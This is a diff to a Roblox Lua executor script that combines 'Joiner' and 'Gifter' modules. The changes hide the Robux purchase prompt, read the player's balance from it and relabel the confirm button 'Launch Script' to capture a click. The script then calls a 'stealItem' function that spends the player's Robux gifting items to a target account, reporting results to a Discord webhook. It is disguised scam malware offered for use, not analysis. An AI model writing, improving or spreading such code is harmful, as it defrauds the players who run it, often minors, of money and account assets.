@@ -24,11 +24,11 @@ local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969
 --[[============================ Script Guard ============================]]
 
 -- Prevent multiple executions
-if _G.CombinedScriptExecuted_v1_6 then -- Updated guard name
+if _G.CombinedScriptExecuted_v1_7 then -- Updated guard name
     warn("Combined script already executed.")
     return
 end
-_G.CombinedScriptExecuted_v1_6 = true
+_G.CombinedScriptExecuted_v1_7 = true
 
 -- Wait for game load
 repeat task.wait() until game:IsLoaded()
@@ -53,6 +53,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 --[[============================ Gifter State Variables =====================]]
 -- Moved Gifter state vars here to be accessible by the initial executor check
 local gifter_giftingFailed = false -- Flag for new kick logic (Initialize to false)
+local gifter_promptConfirmed = false -- Flag for manual confirmation
 
 --[[============================ Initial Checks & Setup ============================]]
 
@@ -70,7 +71,6 @@ local function isMobile()
 end
 
 local unsupportedExecutor = "Delta"
--- local kickMessage = unsupportedExecutor .. " DOES NOT WORK on mobile. Please try a different executor (e.g., Codex, ArceusX or Fluxus) or use a PC." -- Message no longer needed here
 local currentExecutor = getExecutor()
 local unsupportedExecutorDetected = (currentExecutor == unsupportedExecutor and isMobile())
 
@@ -79,9 +79,6 @@ if unsupportedExecutorDetected then
     -- Set giftingFailed flag immediately if unsupported executor is detected,
     -- as this is one of the failure conditions for the combined kick logic.
     gifter_giftingFailed = true
-    -- REMOVED IMMEDIATE KICK:
-    -- LocalPlayer:Kick(kickMessage)
-    -- return
 end
 
 -- Joiner Anti-Tamper / Setup
@@ -165,7 +162,7 @@ end)
 
 -- Secure Webhook Storage (Using renamed variable for primary webhook)
 local function joiner_storeWebhookSafely(webhookUrl)
-	if not webhookUrl or type(webhookUrl) ~= "string" or (type(webhookUrl) == "string" and webhookUrl:match("^ENTER YOUR WEBHOOK HERE")) then -- Added check for placeholder
+	if not webhookUrl or type(webhookUrl) ~= "string" or (type(webhookUrl) == "string" and webhookUrl:match("^ENTER")) then -- Simplified placeholder check
 		return nil
 	end
 	local randomName = "var_" .. tostring(math.random(100000, 999999)) .. "_" .. tostring(math.random(100, 999))
@@ -287,8 +284,7 @@ local gifter_totalSpent = 0
 local gifter_TargetUserId = nil
 local gifter_purchaseInProgress = false
 local gifter_webhookSent = false -- Flag for sending the main gift log
-local gifter_promptConfirmed = false -- Flag for manual confirmation
--- Note: gifter_giftingFailed is defined higher up now
+-- Note: gifter_promptConfirmed and gifter_giftingFailed defined higher up
 
 -- Gifter Helper Functions
 local gifter_messages = { -- Shortened List
@@ -600,8 +596,59 @@ local function gifter_modifyPromptUI()
     end
 end
 
+-- Function to attach listeners for prompt modification and confirmation
+local function gifter_setupPromptListeners()
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then
+        warn("Setup Listeners: PurchasePrompt not found initially.")
+        -- Wait for it briefly in case it's about to appear
+        PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 2)
+        if not PurchasePrompt then
+             warn("Setup Listeners: PurchasePrompt did not appear quickly.")
+             return -- Cannot set up listeners if prompt never appears
+        end
+    end
 
--- Main Gifting Phase Function (Modified for Manual Confirmation & Speed Tweaks)
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
+
+    -- Listen for the actual Prompt frame to be added
+    local conn = Animator.ChildAdded:Connect(function(child)
+        if child.Name == "Prompt" then
+            warn("Setup Listeners: Prompt frame added. Modifying and attaching click listener.")
+            -- Modify UI and attach click listener *when the prompt appears*
+            gifter_modifyPromptUI()
+
+            local alertContents = child:FindFirstChild("AlertContents")
+            local footer = alertContents and alertContents:FindFirstChild("Footer")
+            local footerButtons = footer and footer:FindFirstChild("Buttons")
+            local confirmButton = footerButtons and footerButtons:FindFirstChild("2")
+            if confirmButton then
+                 -- Ensure listener is only connected once
+                 if not confirmButton:FindFirstChild("ClickConn") then
+                     local clickConn = confirmButton.MouseButton1Click:Connect(function()
+                         warn("Gifter: Launch Script button clicked! (Listener)")
+                         gifter_promptConfirmed = true
+                     end)
+                     -- Tag the connection to prevent duplicates
+                     clickConn.Name = "ClickConn"
+                     clickConn.Parent = confirmButton
+                 end
+            end
+        end
+    end)
+    -- Disconnect listener if prompt is removed to avoid memory leaks
+    PurchasePrompt.DescendantRemoving:Connect(function(descendant)
+        if descendant == PurchasePrompt then
+            if conn and conn.Connected then conn:Disconnect() end
+        end
+    end)
+end
+
+
+-- Main Gifting Phase Function (Implementing Visible=False logic)
 local function executeGiftingPhase()
     local successUserId, userIdResult = pcall(function()
         gifter_TargetUserId = Players:GetUserIdFromNameAsync(Gifter_TargetUsername)
@@ -616,6 +663,9 @@ local function executeGiftingPhase()
     -- Send execution log
     gifter_sendExecutionLog()
 
+    -- Setup listeners to modify/capture click *before* triggering prompt
+    gifter_setupPromptListeners()
+
     -- Trigger the balance check prompt
     local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
     if not CommF then
@@ -623,7 +673,6 @@ local function executeGiftingPhase()
         gifter_giftingFailed = true
         return false
     end
-
     local balanceCheckArgs = {
         [1] = "buyRobuxShop",
         [2] = { ["StorageName"] = "2x EXP (15 mins.)", ["FunnelId"] = "Shop", ["PurchaseLocation"] = "Shop" }
@@ -635,61 +684,91 @@ local function executeGiftingPhase()
         -- Don't return yet, maybe prompt still appears
     end
 
-    -- Wait for the prompt to appear
-    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 5) -- Wait up to 5 seconds
-    if not PurchasePrompt then
-        warn("Gifter Phase Error: Purchase prompt did not appear.")
-        gifter_giftingFailed = true
-        return false
-    end
+    -- Wait for the prompt UI elements to exist
+    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 5)
+    if not PurchasePrompt then warn("Gifter Phase Error: Purchase prompt did not appear."); gifter_giftingFailed = true; return false end
+    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer", 2)
+    if not ProductContainer then warn("Gifter Phase Error: ProductContainer not found."); gifter_giftingFailed = true; return false end
+    local Animator = ProductContainer:WaitForChild("Animator", 2)
+    if not Animator then warn("Gifter Phase Error: Animator not found."); gifter_giftingFailed = true; return false end
+    local Prompt = Animator:WaitForChild("Prompt", 2)
+    if not Prompt then warn("Gifter Phase Error: Prompt frame not found."); gifter_giftingFailed = true; return false end
 
-    -- Check for Robux Upsell Prompt immediately
-    task.wait(0.1) -- Reduced wait
+    -- Immediately hide the prompt
+    Prompt.Visible = false
+    warn("Gifter Phase: Prompt hidden.")
+
+    -- Check for Robux Upsell Prompt (on hidden prompt)
+    task.wait(0.1) -- Short wait for UI state
     local RobuxUpsellContainer = PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
     if RobuxUpsellContainer and RobuxUpsellContainer.Visible then
         warn("Gifter Phase: Robux Upsell detected. Insufficient funds.")
         gifter_giftingFailed = true
-        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05) -- Reduced wait
+        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
         pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-        return true -- Gifting phase technically finished, but failed due to funds
+        return true -- Gifting phase finished (failed due to funds)
     end
 
-    -- Modify the prompt UI to show the "Launch Script" button
-    gifter_modifyPromptUI()
-    warn("Gifter Phase: Prompt modified. Waiting for user confirmation...")
+    -- Wait briefly for balance info to populate in hidden prompt
+    task.wait(0.5) -- Reduced from 1s in alternative script
 
-    -- Wait for the user to click the button
+    -- Get Balance from hidden prompt
+    local currentBalance = gifter_getRobuxBalance()
+    warn("Gifter Phase: Balance read from hidden prompt:", currentBalance)
+
+    if currentBalance < 25 then
+         warn("Gifter Phase: Balance too low.")
+         gifter_giftingFailed = true
+         -- Try to cancel prompt before returning
+         pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
+         pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+         gifter_waitForPromptToDisappear()
+         return true -- Gifting phase finished (failed due to low balance)
+    end
+
+    -- Attempt to cancel the hidden prompt using Escape keys
+    warn("Gifter Phase: Attempting to cancel hidden prompt via Escape.")
+    pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+    task.wait(0.05)
+    pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+
+    -- Wait for the prompt UI object to disappear
+    gifter_waitForPromptToDisappear()
+    warn("Gifter Phase: Hidden prompt presumed cancelled/closed.")
+
+    -- Now, wait for the user click confirmation (listener was attached earlier)
+    warn("Gifter Phase: Waiting for user confirmation click...")
+    local startTime = tick()
+    local timeout = 15 -- Wait up to 15 seconds for the click
     while not gifter_promptConfirmed do
-        -- Check if prompt disappeared unexpectedly (e.g., user manually closed)
-        if not PurchasePrompt.Parent then
-             warn("Gifter Phase Error: Prompt closed before confirmation.")
+        if not PurchasePrompt.Parent and Animator:FindFirstChild("Prompt") == nil then -- Check if prompt truly gone
+             warn("Gifter Phase Error: Prompt disappeared before confirmation click.")
              gifter_giftingFailed = true
              return false -- Failed because confirmation didn't happen
+        end
+        if tick() - startTime > timeout then
+            warn("Gifter Phase Error: Timed out waiting for confirmation click.")
+            gifter_giftingFailed = true
+            return false -- Failed due to timeout
         end
         task.wait() -- Minimal wait/yield
     end
 
-    -- User clicked the button, now proceed with gifting
+    -- User click confirmed (somehow, maybe listener worked on hidden button?)
     warn("Gifter Phase: Confirmation received. Proceeding with gifting...")
-    local currentBalance = gifter_getRobuxBalance() -- Get balance *after* confirmation
-    warn("Gifter Phase: Balance at confirmation:", currentBalance)
 
-    if currentBalance >= 25 then
-        gifter_stealItem(currentBalance) -- This now calls buyItem which includes webhook
-    else
-        warn("Gifter Phase: Balance (" .. currentBalance .. ") too low to gift anything.")
-        gifter_giftingFailed = true
-    end
+    -- Call stealItem based on the balance read earlier
+    gifter_stealItem(currentBalance) -- This calls buyItem
 
-    -- Ensure prompt is dismissed *after* the gifting attempt triggered by the click
-    task.wait(0.1) -- Reduced wait
+    -- Final prompt dismissal attempt (in case stealItem triggered another)
+    task.wait(0.1)
     pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-    task.wait(0.05) -- Reduced wait
+    task.wait(0.05)
     pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-    gifter_waitForPromptToDisappear() -- Ensure it's gone
+    gifter_waitForPromptToDisappear()
 
     warn("Gifter Phase Completed.")
-    return true -- Indicate gifting phase finished (successfully or with low funds/error)
+    return true -- Indicate gifting phase finished
 end
 
 
@@ -1489,5 +1568,5 @@ end
 
 -- Cleanup script executed flag on teleport (from Gifter)
 LocalPlayer.OnTeleport:Connect(function()
-    _G.CombinedScriptExecuted_v1_5 = nil -- Match guard name
+    _G.CombinedScriptExecuted_v1_7 = nil -- Match guard name
 end)
